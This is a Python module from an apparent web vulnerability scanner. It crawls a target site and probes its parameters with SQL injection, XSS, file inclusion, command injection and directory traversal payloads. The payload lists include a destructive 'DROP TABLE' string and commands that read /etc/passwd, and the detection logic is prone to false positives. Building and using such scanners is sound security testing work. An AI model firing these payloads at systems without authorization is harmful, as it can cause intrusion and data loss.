"""
ReconScan Scan Command Module

Main scanning functionality for web application vulnerability detection.
Provides modular scanning capabilities for SQL injection, XSS, LFI, command injection, and more.
"""

import asyncio
import aiohttp
import time
import urllib.parse
from pathlib import Path
from typing import List, Dict, Any, Optional
import json

class ScanCommand:
    """
    Core vulnerability scanning command for ReconScan.
    
    Supports multiple scan types including SQL injection, XSS, LFI, command injection,
    and security header analysis with comprehensive reporting.
    """
    
    # Command metadata - self-documenting for help system
    description = "Perform web vulnerability scans on target URLs"
    usage = "scan <target_url> [options]"
    example = "scan https://example.com --modules sqli,xss --output report.txt"
    category = "Scanning"
    
    def __init__(self):
        """Initialize scanner with modules and configuration."""
        
        # Load configuration
        from scanner.config_loader import get_system_config
        self.system_config = get_system_config()
        self.config = self._load_scan_config()
        
        # Available scan modules
        self.available_modules = {
            'sqli': 'SQL Injection Detection',
            'xss': 'Cross-Site Scripting Detection', 
            'lfi': 'Local File Inclusion Detection',
            'cmdinjection': 'Command Injection Detection',
            'headers': 'Security Headers Analysis',
            'dirtraversal': 'Directory Traversal Detection'
        }
        
        # Default modules to run
        self.default_modules = ['sqli', 'xss', 'headers']
        
        # Scan results storage
        self.results = {
            'scan_info': {},
            'vulnerabilities': [],
            'summary': {}
        }
        
    def execute(self, args=None):
        """
        Execute vulnerability scan with specified parameters.
        
        Args:
            args (str, optional): Scan arguments (target URL and options)
            
        Returns:
            bool: True if scan completed successfully
        """
        try:
            if not args or not args.strip():
                self._show_usage()
                return False
            
            # Parse scan arguments
            scan_params = self._parse_args(args.strip())
            
            if not scan_params:
                return False
            
            # Validate target URL
            if not self._validate_target(scan_params['target']):
                print(f"Error: Invalid target URL '{scan_params['target']}'")
                return False
            
            print(f"Starting vulnerability scan on: {scan_params['target']}")
            print(f"Modules: {', '.join(scan_params['modules'])}")
            print("=" * 60)
            
            # Run the scan
            return asyncio.run(self._run_scan(scan_params))
            
        except KeyboardInterrupt:
            print("\nScan interrupted by user.")
            return False
        except Exception as e:
            print(f"Error executing scan: {str(e)}")
            return False
    
    def _parse_args(self, args):
        """
        Parse scan command arguments.
        
        Args:
            args (str): Command line arguments
            
        Returns:
            dict: Parsed scan parameters or None if invalid
        """
        parts = args.split()
        
        if not parts:
            print("Error: Target URL required")
            return None
        
        target = parts[0]
        
        # Parse options
        scan_params = {
            'target': target,
            'modules': self.default_modules.copy(),
            'output': None,
            'verbose': self.config.get('output', {}).get('verbose', True),
            'threads': self.config.get('scanning', {}).get('threads', 5),
            'timeout': self.config.get('network', {}).get('timeout', 10)
        }
        
        # Process additional arguments
        i = 1
        while i < len(parts):
            arg = parts[i]
            
            if arg == '--modules' and i + 1 < len(parts):
                modules = parts[i + 1].split(',')
                scan_params['modules'] = [m.strip() for m in modules if m.strip() in self.available_modules]
                i += 2
            elif arg == '--output' and i + 1 < len(parts):
                scan_params['output'] = parts[i + 1]
                i += 2
            elif arg == '--threads' and i + 1 < len(parts):
                try:
                    scan_params['threads'] = int(parts[i + 1])
                except ValueError:
                    print(f"Warning: Invalid thread count '{parts[i + 1]}', using default")
                i += 2
            elif arg == '--timeout' and i + 1 < len(parts):
                try:
                    scan_params['timeout'] = int(parts[i + 1])
                except ValueError:
                    print(f"Warning: Invalid timeout '{parts[i + 1]}', using default")
                i += 2
            elif arg == '--verbose':
                scan_params['verbose'] = True
                i += 1
            elif arg == '--quiet':
                scan_params['verbose'] = False
                i += 1
            else:
                print(f"Warning: Unknown argument '{arg}', ignoring")
                i += 1
        
        return scan_params
    
    def _validate_target(self, target):
        """
        Validate target URL format and accessibility.
        
        Args:
            target (str): Target URL to validate
            
        Returns:
            bool: True if target is valid
        """
        try:
            parsed = urllib.parse.urlparse(target)
            return bool(parsed.scheme and parsed.netloc)
        except Exception:
            return False
    
    async def _run_scan(self, params):
        """
        Execute the actual vulnerability scan.
        
        Args:
            params (dict): Scan parameters
            
        Returns:
            bool: True if scan completed successfully
        """
        start_time = time.time()
        
        # Initialize scan results
        self.results = {
            'scan_info': {
                'target': params['target'],
                'start_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                'modules': params['modules'],
                'scanner_version': self.system_config.get_app_info()['version']
            },
            'vulnerabilities': [],
            'summary': {}
        }
        
        # Create HTTP session with configuration
        timeout = aiohttp.ClientTimeout(total=params['timeout'])
        connector = aiohttp.TCPConnector(
            limit=params['threads'],
            ssl=not self.config.get('network', {}).get('verify_ssl', False)
        )
        
        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={'User-Agent': self.config.get('network', {}).get('user_agent', 'ReconScan/1.0')}
        ) as session:
            
            # Discover pages and parameters
            if params['verbose']:
                print(f"\n[+] Discovering pages and parameters...")
            
            discovered_urls = await self._discover_urls(session, params['target'], params['verbose'])
            
            # Store discovered URLs for use in modules
            self.discovered_urls = discovered_urls
            
            # Run each module
            for module in params['modules']:
                if params['verbose']:
                    print(f"\n[+] Running {self.available_modules[module]}...")
                
                try:
                    await self._run_module(session, module, params)
                except Exception as e:
                    print(f"[-] Error in {module} module: {str(e)}")
                    continue
        
        # Calculate scan duration
        duration = time.time() - start_time
        self.results['scan_info']['duration'] = f"{duration:.2f}s"
        
        # Generate summary
        self._generate_summary()
        
        # Display results
        self._display_results(params['verbose'])
        
        # Save results if output specified
        if params['output']:
            self._save_results(params['output'])
        
        return True
    
    async def _discover_urls(self, session, target, verbose=True):
        """
        Discover URLs and parameters by crawling the target site.
        
        Args:
            session: aiohttp session
            target (str): Target URL
            verbose (bool): Verbose output
            
        Returns:
            list: List of discovered URLs with parameters
        """
        discovered_urls = []
        visited_urls = set()
        
        try:
            # Parse base URL
            from urllib.parse import urljoin, urlparse, parse_qs
            import re
            
            base_parsed = urlparse(target)
            base_domain = f"{base_parsed.scheme}://{base_parsed.netloc}"
            
            # URLs to crawl
            urls_to_crawl = [target]
            
            # Common pages to check
            common_pages = [
                '', 'index.php', 'index.html', 'index.asp', 'index.aspx',
                'login.php', 'admin.php', 'search.php', 'categories.php',
                'artists.php', 'guestbook.php', 'cart.php', 'profile.php',
                'signup.php', 'contact.php', 'about.php'
            ]
            
            # Add common pages to crawl list
            for page in common_pages:
                full_url = urljoin(base_domain + '/', page)
                if full_url not in urls_to_crawl:
                    urls_to_crawl.append(full_url)
            
            crawl_count = 0
            max_crawl = 10  # Limit crawling to avoid infinite loops
            
            for url in urls_to_crawl:
                if crawl_count >= max_crawl:
                    break
                    
                if url in visited_urls:
                    continue
                    
                try:
                    if verbose:
                        print(f"  → Crawling: {url}")
                    
                    async with session.get(url) as response:
                        if response.status == 200:
                            content = await response.text()
                            visited_urls.add(url)
                            crawl_count += 1
                            
                            # Extract links and forms
                            links = re.findall(r'href=["\']([^"\']+)["\']', content, re.IGNORECASE)
                            forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', content, re.IGNORECASE)
                            
                            # Process links
                            for link in links:
                                full_link = urljoin(url, link)
                                parsed_link = urlparse(full_link)
                                
                                # Only process links from same domain
                                if parsed_link.netloc == base_parsed.netloc:
                                    # Check if link has parameters
                                    if parsed_link.query:
                                        discovered_urls.append(full_link)
                                        if verbose:
                                            print(f"    Found URL with params: {full_link}")
                                    
                                    # Add to crawl list if it's a new page
                                    if full_link not in visited_urls and len(urls_to_crawl) < 20:
                                        urls_to_crawl.append(full_link)
                            
                            # Process forms
                            for form_action in forms:
                                if form_action:
                                    full_form_url = urljoin(url, form_action)
                                    if urlparse(full_form_url).netloc == base_parsed.netloc:
                                        discovered_urls.append(full_form_url)
                                        if verbose:
                                            print(f"    Found form action: {full_form_url}")
                
                except Exception as e:
                    if verbose:
                        print(f"    ! Error crawling {url}: {str(e)}")
                    continue
            
            # If no URLs with parameters found, create test URLs with common parameters
            if not discovered_urls:
                test_params = ['id', 'cat', 'page', 'search', 'artist', 'user']
                for param in test_params:
                    test_url = f"{target}?{param}=1"
                    discovered_urls.append(test_url)
            
            if verbose:
                print(f"  → Discovered {len(discovered_urls)} URLs for testing")
            
            return discovered_urls
            
        except Exception as e:
            if verbose:
                print(f"  ! Error during URL discovery: {str(e)}")
            # Fallback to basic parameter testing
            return [f"{target}?id=1", f"{target}?cat=1", f"{target}?search=test"]
    
    async def _run_module(self, session, module, params):
        """
        Run a specific vulnerability scan module.
        
        Args:
            session: aiohttp session
            module (str): Module name to run
            params (dict): Scan parameters
        """
        target = params['target']
        
        if module == 'sqli':
            await self._scan_sql_injection(session, target, params['verbose'])
        elif module == 'xss':
            await self._scan_xss(session, target, params['verbose'])
        elif module == 'lfi':
            await self._scan_lfi(session, target, params['verbose'])
        elif module == 'cmdinjection':
            await self._scan_command_injection(session, target, params['verbose'])
        elif module == 'headers':
            await self._scan_security_headers(session, target, params['verbose'])
        elif module == 'dirtraversal':
            await self._scan_directory_traversal(session, target, params['verbose'])
    
    async def _scan_sql_injection(self, session, target, verbose=True):
        """Enhanced SQL injection detection using discovered URLs and parameters."""
        if verbose:
            print("  → Testing SQL injection payloads...")
        
        # Enhanced SQL injection payloads
        payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin' /*",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1' OR '1'='1",
            "1 OR 1=1",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "1' AND '1'='2",
            "' WAITFOR DELAY '0:0:5'--",
            "'; DROP TABLE users--"
        ]
        
        vulnerabilities_found = 0
        urls_to_test = []
        
        # Use discovered URLs if available, otherwise use common parameters
        if hasattr(self, 'discovered_urls') and self.discovered_urls:
            urls_to_test = self.discovered_urls
        else:
            # Fallback to common parameter names
            parameters = ['id', 'user', 'username', 'page', 'cat', 'category', 'artist', 'search', 'q', 'query', 'name', 'login']
            for param in parameters:
                urls_to_test.append(f"{target}?{param}=1")
        
        for base_url in urls_to_test:
            # Parse URL to extract parameters
            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
            parsed_url = urlparse(base_url)
            params_dict = parse_qs(parsed_url.query)
            
            # Test each parameter in the URL
            for param_name, param_values in params_dict.items():
                for payload in payloads:
                    try:
                        # Create test URL with payload
                        test_params = params_dict.copy()
                        test_params[param_name] = [payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, 
                                             parsed_url.params, test_query, parsed_url.fragment))
                        
                        async with session.get(test_url) as response:
                            content = await response.text()
                            status_code = response.status
                            
                            # Enhanced SQL error detection
                            error_indicators = [
                                'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB',
                                'SQLServer JDBC Driver', 'PostgreSQL query failed',
                                'sqlite_master', 'SQL syntax', 'mysql_num_rows',
                                'Warning: mysql', 'Warning: mysqli', 'MySQL Error',
                                'ORA-00', 'Microsoft VBScript runtime', 'ADODB.Field',
                                'mysql_connect', 'mysql_query', 'mysql_result',
                                'PostgreSQL query failed', 'supplied argument is not a valid MySQL',
                                'Column count doesn\'t match', 'mysql_fetch_assoc',
                                'mysql_fetch_row', 'mysql_fetch_object', 'mysql_numrows',
                                'Error Occurred While Processing Request', 'Server Error',
                                'Microsoft OLE DB Provider for ODBC Drivers',
                                'Invalid Querystring', 'OLE DB Provider for SQL Server',
                                'Unclosed quotation mark after the character string',
                                'Microsoft OLE DB Provider for Oracle', 'error in your SQL syntax',
                                'Syntax error in query expression', 'Data source name not found',
                                'Incorrect syntax near', 'mysql_error', 'mysql_errno',
                                'Warning: pg_', 'valid PostgreSQL result', 'Npgsql\\.',
                                'PG::SyntaxError', 'org.postgresql.util.PSQLException',
                                'ERROR: parser: parse error', 'PostgreSQL.*ERROR',
                                'Warning.*\\Wpg_', 'valid PostgreSQL result', 'Npgsql\\.',
                                'Exception (Npgsql|PG|PostgreSQL)', 'Microsoft Access Driver',
                                'JET Database Engine', 'Access Database Engine'
                            ]
                            
                            # Check for SQL errors
                            if any(indicator.lower() in content.lower() for indicator in error_indicators):
                                vulnerability = {
                                    'type': 'SQL Injection',
                                    'severity': 'High',
                                    'url': test_url,
                                    'payload': payload,
                                    'description': f'SQL injection vulnerability detected in parameter "{param_name}" through error-based testing'
                                }
                                self.results['vulnerabilities'].append(vulnerability)
                                vulnerabilities_found += 1
                                
                                if verbose:
                                    print(f"     SQL injection found: {param_name}={payload}")
                                break
                            
                            # Check for boolean-based blind SQL injection
                            elif payload in ["' OR '1'='1", "1 OR 1=1", "' OR 'x'='x"]:
                                # Get baseline response with original parameter value
                                baseline_params = params_dict.copy()
                                baseline_query = urlencode(baseline_params, doseq=True)
                                baseline_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                                         parsed_url.params, baseline_query, parsed_url.fragment))
                                
                                async with session.get(baseline_url) as baseline_response:
                                    baseline_content = await baseline_response.text()
                                    
                                    # If response is significantly different, might be vulnerable
                                    if len(content) != len(baseline_content) and abs(len(content) - len(baseline_content)) > 100:
                                        vulnerability = {
                                            'type': 'SQL Injection (Boolean-based)',
                                            'severity': 'High',
                                            'url': test_url,
                                            'payload': payload,
                                            'description': f'Potential boolean-based SQL injection in parameter "{param_name}"'
                                        }
                                        self.results['vulnerabilities'].append(vulnerability)
                                        vulnerabilities_found += 1
                                        
                                        if verbose:
                                            print(f"     Boolean SQL injection found: {param_name}={payload}")
                                        break
                            
                    except Exception as e:
                        if verbose:
                            print(f"    ! Error testing {param_name} with '{payload}': {str(e)}")
                        continue
        
        if verbose and vulnerabilities_found == 0:
            print("     No SQL injection vulnerabilities detected")
    
    async def _scan_xss(self, session, target, verbose=True):
        """Enhanced XSS detection with multiple parameter testing."""
        if verbose:
            print("   Testing XSS payloads...")
        
        # Enhanced XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "'-alert('XSS')-'",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>"
        ]
        
        # Common parameter names for XSS testing
        parameters = ['q', 'search', 'query', 'name', 'comment', 'message', 'text', 'input', 'data', 'value', 'content', 'title']
        
        vulnerabilities_found = 0
        
        for param in parameters:
            for payload in payloads:
                try:
                    # Test with different parameters
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                    
                    async with session.get(test_url) as response:
                        content = await response.text()
                        
                        # Check if payload is reflected in response (various encodings)
                        payload_variations = [
                            payload,
                            payload.replace("'", "&#x27;"),
                            payload.replace("'", "&#39;"),
                            payload.replace("\"", "&quot;"),
                            payload.replace("<", "&lt;"),
                            payload.replace(">", "&gt;"),
                            payload.replace("&", "&amp;"),
                            payload.lower(),
                            payload.upper()
                        ]
                        
                        if any(var in content for var in payload_variations):
                            vulnerability = {
                                'type': 'Cross-Site Scripting (XSS)',
                                'severity': 'Medium',
                                'url': test_url,
                                'payload': payload,
                                'description': f'XSS vulnerability detected in parameter "{param}" through payload reflection'
                            }
                            self.results['vulnerabilities'].append(vulnerability)
                            vulnerabilities_found += 1
                            
                            if verbose:
                                print(f"     XSS vulnerability found: {param}={payload}")
                            break
                            
                except Exception as e:
                    if verbose:
                        print(f"    ! Error testing {param} with '{payload}': {str(e)}")
                    continue
        
        if verbose and vulnerabilities_found == 0:
            print("     No XSS vulnerabilities detected")
    
    async def _scan_lfi(self, session, target, verbose=True):
        """Basic Local File Inclusion detection."""
        if verbose:
            print("  → Testing LFI payloads...")
        
        # Basic LFI payloads
        payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../etc/passwd%00",
            "..\\..\\..\\..\\boot.ini"
        ]
        
        vulnerabilities_found = 0
        
        for payload in payloads:
            try:
                # Test with file parameter
                test_url = f"{target}?file={urllib.parse.quote(payload)}"
                
                async with session.get(test_url) as response:
                    content = await response.text()
                    
                    # Look for file inclusion indicators
                    lfi_indicators = [
                        'root:x:0:0:', '[boot loader]', 'localhost',
                        '# This file contains', 'daemon:x:'
                    ]
                    
                    if any(indicator in content for indicator in lfi_indicators):
                        vulnerability = {
                            'type': 'Local File Inclusion (LFI)',
                            'severity': 'High',
                            'url': test_url,
                            'payload': payload,
                            'description': 'LFI vulnerability detected through file content disclosure'
                        }
                        self.results['vulnerabilities'].append(vulnerability)
                        vulnerabilities_found += 1
                        
                        if verbose:
                            print(f"    ✗ LFI vulnerability found: {payload}")
                        break
                        
            except Exception as e:
                if verbose:
                    print(f"    ! Error testing payload '{payload}': {str(e)}")
                continue
        
        if verbose and vulnerabilities_found == 0:
            print("    ✓ No LFI vulnerabilities detected")
    
    async def _scan_command_injection(self, session, target, verbose=True):
        """Basic command injection detection."""
        if verbose:
            print("  → Testing command injection payloads...")
        
        # Basic command injection payloads
        payloads = [
            "; ls",
            "| whoami",
            "&& id",
            "; cat /etc/passwd",
            "| ping -c 1 127.0.0.1",
            "&& echo 'command_injection_test'"
        ]
        
        vulnerabilities_found = 0
        
        for payload in payloads:
            try:
                # Test with cmd parameter
                test_url = f"{target}?cmd={urllib.parse.quote(payload)}"
                
                async with session.get(test_url) as response:
                    content = await response.text()
                    
                    # Look for command execution indicators
                    cmd_indicators = [
                        'uid=', 'gid=', 'root:x:0:0:', 'PING',
                        'command_injection_test', 'total 0'
                    ]
                    
                    if any(indicator in content for indicator in cmd_indicators):
                        vulnerability = {
                            'type': 'Command Injection',
                            'severity': 'Critical',
                            'url': test_url,
                            'payload': payload,
                            'description': 'Command injection vulnerability detected through command execution'
                        }
                        self.results['vulnerabilities'].append(vulnerability)
                        vulnerabilities_found += 1
                        
                        if verbose:
                            print(f"     Command injection found: {payload}")
                        break
                        
            except Exception as e:
                if verbose:
                    print(f"    ! Error testing payload '{payload}': {str(e)}")
                continue
        
        if verbose and vulnerabilities_found == 0:
            print("    ✓ No command injection vulnerabilities detected")
    
    async def _scan_security_headers(self, session, target, verbose=True):
        """Analyze security headers."""
        if verbose:
            print("  → Analyzing security headers...")
        
        try:
            async with session.get(target) as response:
                headers = response.headers
                
                # Check for important security headers
                security_headers = {
                    'X-Frame-Options': 'Clickjacking protection',
                    'X-XSS-Protection': 'XSS filtering',
                    'X-Content-Type-Options': 'MIME sniffing protection',
                    'Content-Security-Policy': 'Content Security Policy',
                    'Strict-Transport-Security': 'HTTPS enforcement',
                    'Referrer-Policy': 'Referrer information control',
                    'Feature-Policy': 'Feature access control'
                }
                
                missing_headers = []
                
                for header, description in security_headers.items():
                    if header not in headers:
                        missing_headers.append(header)
                        
                        vulnerability = {
                            'type': 'Missing Security Header',
                            'severity': 'Low',
                            'url': target,
                            'payload': f"Missing: {header}",
                            'description': f'Missing security header: {header} ({description})'
                        }
                        self.results['vulnerabilities'].append(vulnerability)
                
                if verbose:
                    if missing_headers:
                        print(f"     Missing security headers: {', '.join(missing_headers)}")
                    else:
                        print("     All important security headers present")
                        
        except Exception as e:
            if verbose:
                print(f"    ! Error analyzing headers: {str(e)}")
    
    async def _scan_directory_traversal(self, session, target, verbose=True):
        """Basic directory traversal detection."""
        if verbose:
            print("  → Testing directory traversal...")
        
        # Directory traversal payloads
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]
        
        vulnerabilities_found = 0
        
        for payload in payloads:
            try:
                test_url = f"{target}?path={urllib.parse.quote(payload)}"
                
                async with session.get(test_url) as response:
                    content = await response.text()
                    
                    # Look for directory traversal indicators
                    traversal_indicators = [
                        'root:x:0:0:', '[fonts]', 'for 16-bit app support'
                    ]
                    
                    if any(indicator in content for indicator in traversal_indicators):
                        vulnerability = {
                            'type': 'Directory Traversal',
                            'severity': 'High',
                            'url': test_url,
                            'payload': payload,
                            'description': 'Directory traversal vulnerability detected'
                        }
                        self.results['vulnerabilities'].append(vulnerability)
                        vulnerabilities_found += 1
                        
                        if verbose:
                            print(f"    ✗ Directory traversal found: {payload}")
                        break
                        
            except Exception as e:
                if verbose:
                    print(f"    ! Error testing payload '{payload}': {str(e)}")
                continue
        
        if verbose and vulnerabilities_found == 0:
            print("    ✓ No directory traversal vulnerabilities detected")
    
    def _generate_summary(self):
        """Generate scan summary statistics."""
        vulnerabilities = self.results['vulnerabilities']
        
        # Count by severity
        severity_count = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
        type_count = {}
        
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'Unknown')
            vuln_type = vuln.get('type', 'Unknown')
            
            if severity in severity_count:
                severity_count[severity] += 1
            
            type_count[vuln_type] = type_count.get(vuln_type, 0) + 1
        
        self.results['summary'] = {
            'total_vulnerabilities': len(vulnerabilities),
            'by_severity': severity_count,
            'by_type': type_count
        }
    
    def _display_results(self, verbose=True):
        """Display scan results to console."""
        print("\n" + "=" * 60)
        print("SCAN RESULTS")
        print("=" * 60)
        
        summary = self.results['summary']
        print(f"Target: {self.results['scan_info']['target']}")
        print(f"Duration: {self.results['scan_info']['duration']}")
        print(f"Total vulnerabilities found: {summary['total_vulnerabilities']}")
        
        if summary['total_vulnerabilities'] > 0:
            print("\nBy Severity:")
            for severity, count in summary['by_severity'].items():
                if count > 0:
                    print(f"  {severity}: {count}")
            
            print("\nBy Type:")
            for vuln_type, count in summary['by_type'].items():
                print(f"  {vuln_type}: {count}")
            
            if verbose:
                print("\nDetailed Results:")
                for i, vuln in enumerate(self.results['vulnerabilities'], 1):
                    print(f"\n{i}. {vuln['type']} ({vuln['severity']})")
                    print(f"   URL: {vuln['url']}")
                    print(f"   Description: {vuln['description']}")
        else:
            print("\n✓ No vulnerabilities detected")
    
    def _save_results(self, output_file):
        """Save scan results to formatted text file using ReportCommand."""
        try:
            # Import ReportCommand to use its report generation
            from scanner.commands.report import ReportCommand
            
            # Use ReportCommand to generate and save the report
            output_path = ReportCommand.save_scan_results(self.results, output_file)
            
            print(f"\nResults saved to: {output_path}")
            
        except Exception as e:
            print(f"Error saving results: {str(e)}")
    
    def _load_scan_config(self):
        """Load scan configuration from file."""
        try:
            config_file = Path("config/scanner_config.json")
            if config_file.exists():
                with open(config_file, 'r') as f:
                    return json.load(f)
            else:
                # Return default configuration
                return {
                    "network": {
                        "timeout": 10,
                        "user_agent": "ReconScan/1.0",
                        "verify_ssl": False
                    },
                    "scanning": {
                        "threads": 5,
                        "delay": 0.5
                    },
                    "output": {
                        "verbose": True,
                        "report_format": "json"
                    }
                }
        except Exception:
            return {}
    
    def _show_usage(self):
        """Display usage information."""
        print("Usage: scan <target_url> [options]")
        print("\nOptions:")
        print("  --modules <list>    Comma-separated list of modules to run")
        print("                      Available: " + ", ".join(self.available_modules.keys()))
        print("  --output <file>     Save results to file (JSON format)")
        print("  --threads <num>     Number of concurrent threads (default: 5)")
        print("  --timeout <sec>     HTTP timeout in seconds (default: 10)")
        print("  --verbose           Enable verbose output (default)")
        print("  --quiet             Disable verbose output")
        print("\nExamples:")
        print("  scan https://example.com")
        print("  scan https://example.com --modules sqli,xss,headers")
        print("  scan https://example.com --output results.txt --threads 10")
        print("  scan https://example.com --modules lfi,cmdinjection --quiet")
